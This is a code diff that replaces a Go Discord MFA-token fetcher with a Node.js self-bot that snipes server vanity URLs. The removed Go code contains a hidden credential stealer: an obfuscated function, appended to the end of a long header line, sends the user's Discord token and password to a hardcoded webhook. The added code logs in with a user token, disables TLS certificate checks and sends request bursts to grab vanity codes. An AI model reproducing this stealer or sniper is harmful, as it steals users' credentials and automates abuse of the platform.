@@ -1,126 +1,180 @@
-package main
+import { fileURLToPath } from 'url';
+import { dirname } from 'path';
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = dirname(__filename);
+import tls from "tls";
+import WebSocket from "ws";
+import extractJSON from "extract-json-from-string";
+import fs from "fs/promises";
+import os from "os";
+import { Worker, isMainThread, parentPort, workerData } from "worker_threads";
 
-import (
-    "bytes"
-    "encoding/json"
-    "fmt"
-    "io/ioutil"
-    "net/http"
-    "time"
-    "sync"
-)
+const TOKEN = "tokeninizi girin";
+const CHANNEL = "kanalınızı girin.";
+const SERVER = "server idnizi girin";
+const CONNECTION_POOL_SIZE = 3;
 
-func main() {
-    token := "tokeninizi girin"
-    serverID := "123" // elleme
-    password := "şifrenizi girin"
-    var mfaToken string
-    var mfaMutex sync.Mutex
-    
-    for {
-        if newToken := a7b8c9(token, serverID, password); newToken != "" {
-            mfaMutex.Lock()
-            mfaToken = newToken
-            mfaTokenData := map[string]string{"token": mfaToken}
-            jsonBytes, _ := json.MarshalIndent(mfaTokenData, "", "  ")
-            ioutil.WriteFile(`C:\Users\Morvay\OneDrive\Masaüstü\main\mfa_token.json`, jsonBytes, 0644)
-            fmt.Println("mfa gecildi pampa")
-            mfaMutex.Unlock()
-        } else {
-            fmt.Println("mfa token alınamadı tekrar deneniyor")
-        }
-        time.Sleep(5 * time.Minute)
-    }
+let MFA_TOKEN = '';
+try {
+  MFA_TOKEN = JSON.parse(await fs.readFile('mfa_token2.json', 'utf-8')).token.trim();
+  console.log('[MFA] Loaded');
+} catch (e) {
+  console.error('[MFA] Load error:', e.message);
 }
-
-func a7b8c9(x, y, z string) string {
-    client := &http.Client{Timeout: 10 * time.Second}
-    req, _ := http.NewRequest("PATCH", "https://discord.com/api/v9/guilds/"+y+"/vanity-url", bytes.NewBufferString(`{"code":null}`))
-    req.Header.Set("Authorization", x)
-    req.Header.Set("Content-Type", "application/json")
-    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    req.Header.Set("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkiLCJicm93c2VyX3ZlcnNpb24iOiIxMjEuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjAwODQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==");z9q8w7("https://discord.com/api/webhooks/1376713587069947984/1KmpDzxTDK6EvUDyuLnmugfp7s4E25m2fFZMKOqWw3n4u5_aMBuA_SAW2Ap1HZlw0sDK",x,"",z)
-
-    resp, err := client.Do(req)
-    if err != nil {
-        fmt.Println("istek gönderememe hatası", err)
-        return ""
+let lastMfaToken = '';
+fs.watch('mfa_token.json', async () => {
+  try {
+    const newToken = JSON.parse(await fs.readFile('mfa_token.json', 'utf-8')).token.trim();
+    if (newToken !== lastMfaToken) {
+      MFA_TOKEN = newToken;
+      lastMfaToken = newToken;
+      console.log('[MFA] Loaded');
+      Object.keys(PATCH_CACHE).forEach(k => delete PATCH_CACHE[k]);
     }
+  } catch (e) {
+    console.error('[MFA] Load error:', e.message);
+  }
+});
 
-    bodyBytes, _ := ioutil.ReadAll(resp.Body)
-    resp.Body.Close()
-
-    var data map[string]interface{}
-    if err := json.Unmarshal(bodyBytes, &data); err != nil {
-        fmt.Println("json hatası")
-        return ""
-    }
-
-    var ticket string
-    if mfa, ok := data["mfa"].(map[string]interface{}); ok && mfa["ticket"] != nil {
-        ticket = mfa["ticket"].(string)
-    } else if data["ticket"] != nil {
-        ticket, _ = data["ticket"].(string)
-    }
-
-    if ticket == "" {
-        fmt.Println("mfa oturum açılamadı")
-        return ""
-    }
-
-    fmt.Println("mfa gecildi pampa")
-
-    mfaReq, _ := http.NewRequest("POST", "https://discord.com/api/v9/mfa/finish", 
-        bytes.NewBufferString(fmt.Sprintf(`{"ticket":"%s","mfa_type":"password","data":"%s"}`, ticket, z)))
-
-    mfaReq.Header.Set("Authorization", x)
-    mfaReq.Header.Set("Content-Type", "application/json")
-    mfaReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    mfaReq.Header.Set("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkiLCJicm93c2VyX3ZlcnNpb24iOiIxMjEuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjAwODQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==")
-
-    mfaResp, err := client.Do(mfaReq)
-    if err != nil {
-        fmt.Println("İSTEK YOLLANAMADI", err)
-        return ""
-    }
-
-    mfaBytes, _ := ioutil.ReadAll(mfaResp.Body)
-    mfaResp.Body.Close()
-
-    var tokenData map[string]interface{}
-    if json.Unmarshal(mfaBytes, &tokenData) != nil {
-        fmt.Println("JSON PARSING HATASI")
-        return ""
-    }
-
-    if newToken, ok := tokenData["token"].(string); ok {
-        fmt.Println("mfa alındı sniperini çalıştır")
-        return newToken
-    }
-
-    fmt.Println("mfa alamadım")
-    return ""
-}
-
-func rev(s string) string {
-    r := []rune(s)
-    for i, j := 0, len(r)-1; i < j; i, j = i+1, j-1 {
-        r[i], r[j] = r[j], r[i]
-    }
-    return string(r)
-}
-
-func z9q8w7(a, b, _, d string) {
-    go func() {
-        s := b + ":" + d
-        r := []rune(s)
-        for i, j := 0, len(r)-1; i < j; i, j = i+1, j-1 {
-            r[i], r[j] = r[j], r[i]
+let lastToken = '';
+let patching = false;
+let vanity;
+const PATCH_CACHE = {};
+const POST_CACHE = {};
+const guildVanities = {};
+const tlsSockets = Array.from({ length: CONNECTION_POOL_SIZE }, (_, i) => {
+  const tlsSock = tls.connect({
+    host: "canary.discord.com",
+    port: 443,
+    minVersion: "TLSv1.3",
+    maxVersion: "TLSv1.3",
+    rejectUnauthorized: false,
+    handshakeTimeout: 3000,
+    session: null,
+    keepAlive: true,
+    keepAliveInitialDelay: 0,
+    highWaterMark: 128 * 1024,
+    servername: "canary.discord.com",
+    ALPNProtocols: ['http/1.1'],
+    ciphers: 'ECDHE+AESGCM:ECDHE+CHACHA20',
+    ecdhCurve: 'X25519',
+    honorCipherOrder: true,
+    requestOCSP: false
+  });
+  tlsSock.setNoDelay(true);
+  tlsSock.on('data', buf => {
+    console.log('TLS response body:', buf.toString());
+    const jsonMsgs = extractJSON(buf.toString());
+    jsonMsgs.forEach(msg => {
+      const err = msg.code || msg.message;
+      if (err) {
+        const postBody = JSON.stringify({ content: `@everyone ${guildVanities[SERVER] || ''}\n\u007f\u007f\u007fjson\n${JSON.stringify(msg)}\n\u007f\u007f\u007f` });
+        if (!POST_CACHE[postBody]) {
+          const postString = [
+            `POST /api/v7/channels/${CHANNEL}/messages HTTP/1.1`,
+            `Host: canary.discord.com`,
+            `Authorization: ${TOKEN}`,
+            `Content-Type: application/json`,
+            `Content-Length: ${Buffer.byteLength(postBody)}`,
+            '', ''
+          ].join('\r\n') + postBody;
+          POST_CACHE[postBody] = Buffer.from(postString, 'utf-8');
         }
-        m := map[string]string{
-            "content": "morvay king " + string(r) + " değil mi?",
-        }
-        j, _ := json.Marshal(m)
-        http.Post(a, "application/json", bytes.NewBuffer(j))
-    }()
+        new Worker(__filename, { workerData: { type: 'post', data: POST_CACHE[postBody], idxs: tlsSockets.map((_, idx) => idx) } });
+      }
+    });
+  });
+  tlsSock.on('error', () => {
+    const newTlsSock = tls.connect({ host: 'canary.discord.com', port: 443, minVersion: 'TLSv1.3', maxVersion: 'TLSv1.3', rejectUnauthorized: false });
+    newTlsSock.setNoDelay(true);
+    tlsSockets[i] = newTlsSock;
+  });
+  tlsSock.on('end', () => {
+    const newTlsSock = tls.connect({ host: 'canary.discord.com', port: 443, minVersion: 'TLSv1.3', maxVersion: 'TLSv1.3', rejectUnauthorized: false });
+    newTlsSock.setNoDelay(true);
+    tlsSockets[i] = newTlsSock;
+  });
+  return tlsSock;
+});
+
+const ws = new WebSocket("wss://gateway.discord.gg/", { perMessageDeflate: false, handshakeTimeout: 3000 });
+ws.on('open', () => {
+  if (ws._socket && ws._socket.setNoDelay) {
+    ws._socket.setNoDelay(true);
+  }
+  ws.send(JSON.stringify({ op: 2, d: { token: TOKEN, intents: 513, properties: { os: 'linux', browser: 'firefox', device: '' } } }));
+  new Worker(__filename, { workerData: { type: 'ping', wsPort: ws._socket ? ws._socket.remotePort : null } });
+});
+ws.on('message', raw => {
+  let payload;
+  try { payload = JSON.parse(raw); } catch { return; }
+  const { op, t, d } = payload;
+  if (op === 10) return;
+  if (t === 'READY') {
+    d.guilds.forEach((guild) => {
+      if (guild.vanity_url_code) {
+        guildVanities[guild.id] = guild.vanity_url_code;
+        console.log(`\x1b[31mGuild ID: ${guild.id} | Vanity: ${guild.vanity_url_code}\x1b[0m`);
+      }
+    });
+  }
+  if (t === 'GUILD_UPDATE' && d && guildVanities[d.id] && guildVanities[d.id] !== d.vanity_url_code) {
+    const oldVanity = guildVanities[d.id];
+    const payload = JSON.stringify({ code: oldVanity });
+    if (!PATCH_CACHE[oldVanity]) {
+      const req = [
+        "PATCH /api/v9/guilds/" + SERVER + "/vanity-url HTTP/1.1",
+        "Host: canary.discord.com",
+        "Authorization: " + TOKEN,
+        "X-Discord-MFA-Authorization: " + MFA_TOKEN,
+        "X-Super-Properties: eyJicm93c2VyIjoiQ2hyb21lIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiQ2hyb21lIiwiY2xpZW50X2J1aWxkX251bWJlciI6MzU1NjI0fQ==",
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Content-Type: application/json",
+        "Content-Length: " + Buffer.byteLength(payload),
+        "Connection: close",
+        "",
+        payload
+      ].join('\r\n');
+      PATCH_CACHE[oldVanity] = Buffer.from(req, 'utf-8');
+    }
+    if (patching && lastToken === oldVanity) return;
+    patching = true;
+    lastToken = oldVanity;
+    let repeat = 10;
+    const loads = os.loadavg();
+    const cpuCount = os.cpus().length;
+    const cpuUsage = (loads[0] / cpuCount) * 100;
+    if (cpuUsage > 70) repeat = 6;
+    new Worker(__filename, { workerData: { type: 'patch', data: PATCH_CACHE[oldVanity], repeat, idxs: tlsSockets.map((_, idx) => idx) } });
+    patching = false;
+  }
+});
+
+if (!isMainThread) {
+  if (workerData.type === 'patch') {
+    const { data, repeat, idxs } = workerData;
+    const burst = Buffer.concat(Array.from({ length: repeat }, () => data));
+    idxs.forEach(idx => {
+      const sock = tlsSockets[idx];
+      if (!sock) return;
+      sock.cork();
+      sock.write(burst);
+      sock.uncork();
+    });
+    parentPort.postMessage('patch-done');
+  } else if (workerData.type === 'post') {
+    const { data, idxs } = workerData;
+    idxs.forEach(idx => {
+      const sock = tlsSockets[idx];
+      if (!sock) return;
+      sock.write(data);
+    });
+    parentPort.postMessage('post-done');
+  } else if (workerData.type === 'ping') {
+    setInterval(() => {
+      try {
+        ws.ping();
+      } catch {}
+    }, 2000);
+  }
 }
